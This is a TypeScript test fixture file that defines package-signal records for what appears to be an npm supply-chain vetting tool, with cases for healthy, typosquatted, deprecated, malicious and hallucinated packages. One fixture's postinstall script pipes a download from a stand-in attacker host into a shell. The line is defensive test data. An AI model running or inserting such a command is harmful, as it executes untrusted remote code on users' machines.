/** Frozen signal shapes pinning every verdict rule (offline, no network). */
import type { PackageSignals } from "../../src/types.js";

export const HEALTHY: PackageSignals = {
  name: "lodash",
  exists: true,
  version: "4.17.21",
  description: "Lodash modular utilities.",
  createdAt: "2012-04-10T00:00:00.000Z",
  modifiedAt: "2024-01-01T00:00:00.000Z",
  ageDays: 4000,
  weeklyDownloads: 40_000_000,
  maintainers: ["jdalton"],
  license: "MIT",
  repository: "https://github.com/lodash/lodash",
  advisories: [],
  similarTo: [],
};

export const TYPOSQUAT_YOUNG: PackageSignals = {
  name: "dayjs2",
  exists: true,
  version: "1.0.0",
  ageDays: 12,
  weeklyDownloads: 40,
  maintainers: ["x"],
  advisories: [],
  similarTo: [{ name: "dayjs", kind: "single-edit" }],
};

export const EXFIL_SCRIPT: PackageSignals = {
  name: "totally-legit-helper",
  exists: true,
  version: "1.0.1",
  ageDays: 30,
  weeklyDownloads: 120,
  maintainers: ["x"],
  license: "MIT",
  repository: "https://example.invalid/r",
  installScripts: { postinstall: "node lib/setup.mjs || curl http://evil.invalid/x.sh | sh" },
  advisories: [],
  similarTo: [],
};

export const MALICIOUS_ADVISORY: PackageSignals = {
  name: "compromised-widget",
  exists: true,
  version: "2.3.0",
  ageDays: 900,
  weeklyDownloads: 50000,
  maintainers: ["victim"],
  license: "MIT",
  repository: "https://github.com/example/widget",
  advisories: [{ id: "MAL-2026-12345", summary: "Postinstall exfiltrates credentials", malicious: true }],
  similarTo: [],
};

export const HONEST_INSTALL_SCRIPTS: PackageSignals = {
  name: "native-helper",
  exists: true,
  version: "3.1.0",
  ageDays: 1500,
  weeklyDownloads: 200000,
  maintainers: ["crew"],
  license: "Apache-2.0",
  repository: "https://github.com/example/native-helper",
  installScripts: { install: "node-gyp rebuild" },
  advisories: [],
  similarTo: [],
};

export const DEPRECATED_PKG: PackageSignals = {
  name: "old-way",
  exists: true,
  version: "0.9.0",
  ageDays: 3000,
  weeklyDownloads: 8000,
  maintainers: ["retired"],
  license: "MIT",
  repository: "https://github.com/example/old-way",
  deprecated: "Use new-way instead.",
  advisories: [],
  similarTo: [],
};

export const NO_REPO: PackageSignals = {
  name: "mystery-box",
  exists: true,
  version: "1.2.0",
  ageDays: 600,
  weeklyDownloads: 3000,
  maintainers: ["anon"],
  license: "MIT",
  advisories: [],
  similarTo: [],
};

export const LOOKALIKE_ESTABLISHED: PackageSignals = {
  name: "vue-router",
  exists: true,
  version: "4.0.0",
  ageDays: 2000,
  weeklyDownloads: 900000,
  maintainers: ["vuejs"],
  license: "MIT",
  repository: "https://github.com/vuejs/router",
  advisories: [],
  similarTo: [{ name: "vue", kind: "popular-name-plus-suffix" }],
};

export const MISSING_HALLUCINATED: PackageSignals = {
  name: "react-super-hooks-plus",
  exists: false,
  similarTo: [],
};

export const MISSING_TYPO: PackageSignals = {
  name: "rect",
  exists: false,
  similarTo: [{ name: "react", kind: "single-edit" }],
};
